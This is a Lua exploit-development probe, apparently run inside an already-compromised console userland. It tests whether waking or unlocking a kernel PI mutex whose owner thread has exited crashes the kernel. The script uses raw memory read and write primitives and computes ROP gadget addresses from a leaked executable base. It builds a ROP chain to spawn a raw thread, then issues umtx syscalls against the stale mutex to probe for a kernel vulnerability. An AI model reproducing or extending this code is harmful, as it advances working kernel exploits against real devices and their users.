-- CRASH_CLASS: HIGH
-- PROBE 545a: waking a PI mutex whose owner thread has exited
--
-- Context: 544a showed that a caller blocked in op 5 is never released when
-- the owner thread exits while holding the mutex (the loader thread had to be
-- relaunched). That leaves a kernel ownership record attached to a thread that
-- no longer exists, and the userland word still naming it.
--
-- This probe builds that state without blocking anyone: a raw child takes a
-- PI mutex, sleeps 100 ms, and exits. The parent then checks whether the child
-- thread is gone, and calls the wake-shaped ops (22, 18, 3) and unlock (6)
-- against the stale word.

print("=== PROBE 545a: DEAD OWNER WAKE ===")
print("")
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))
local function emit_sysarch_preamble(emit)
    emit(g_pop_rdi);   emit(uint64(129))
    emit(g_pop_rsi);   emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);   emit(uint64(165))
    emit(stub)
end

local sc454 = mk(454)
local sc_thr_new = mk(455)
local sc_thr_kill = mk(432)
local M = memory.alloc(0x40)
wd(N(M) + 0, 0)
wd(N(M) + 4, 0x10)

local ts = memory.alloc(0x10)
wd(N(ts), 0); wd(N(ts) + 4, 0); wd(N(ts) + 8, 100000000); wd(N(ts) + 12, 0)

local CHAIN_MAX = 0x8000
local stk = memory.alloc(0x8000 + CHAIN_MAX)
local sb = N(stk)
local ss = 0x8000
local rsp = sb + ss - 8
local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

emit_sysarch_preamble(emit)
emit(g_pop_rdi); emit(uint64(N(M)))
emit(g_pop_rsi); emit(uint64(5))
emit(g_pop_rdx); emit(uint64(0))
emit(g_pop_rax); emit(uint64(454))
emit(stub)
emit(g_pop_rdi); emit(uint64(N(ts)))
emit(g_pop_rax); emit(uint64(240))
emit(stub)
emit(g_pop_rdi); emit(uint64(0))
emit(g_pop_rax); emit(uint64(431))
emit(stub)

local par = memory.alloc(0x40)
local pa = N(par)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa + 0x00, g_bare_ret)
wq(pa + 0x08, uint64(0))
wq(pa + 0x10, uint64(sb))
wq(pa + 0x18, uint64(ss))
local tid_ptr = memory.alloc(8)
wq(N(tid_ptr), uint64(0))
wq(pa + 0x30, tid_ptr)

print(string.format("[B] chain bytes=%d", off))
local ok, rv = pcall(function() return sc_thr_new(par, uint64(0x38)) end)
print(string.format("[C] thr_new ok=%s rv=%s", tostring(ok), tostring(N(rv))))
local spins = 0
while spins < 300000 and (rd(N(M)) or 0) == 0 do spins = spins + 1 end
print(string.format("[D] owner word=%08X spins=%d", rd(N(M)) or 0, spins))
local tid = rd(N(tid_ptr)) or 0
print(string.format("[E] child tid=%08X", tid))
for i = 1, 400000 do end
print("[F] after delay")
if tid ~= 0 then
    local kr = -999
    pcall(function() kr = N(sc_thr_kill(uint64(tid), uint64(0))) end)
    print(string.format("[G] thr_kill(%08X,0)=%d", tid, kr))
end
local function op(tag, o, a1, a2)
    local ret = -999
    pcall(function() ret = N(sc454(uint64(N(M)), uint64(o), uint64(0), uint64(a1), uint64(a2))) end)
    print(string.format("%s op=%d ret=%d word=%08X alive=%s", tag, o, ret, rd(N(M)) or 0, tostring(alive())))
end
op("[H]", 3, 0, 1)
op("[I]", 18, 0, 1)
op("[J]", 22, 0, 0)
op("[K]", 22, N(M), 0)
op("[L]", 6, 0, 0)
print(string.format("[M] final word=%08X alive=%s", rd(N(M)) or 0, tostring(alive())))
print("=== DONE ===")
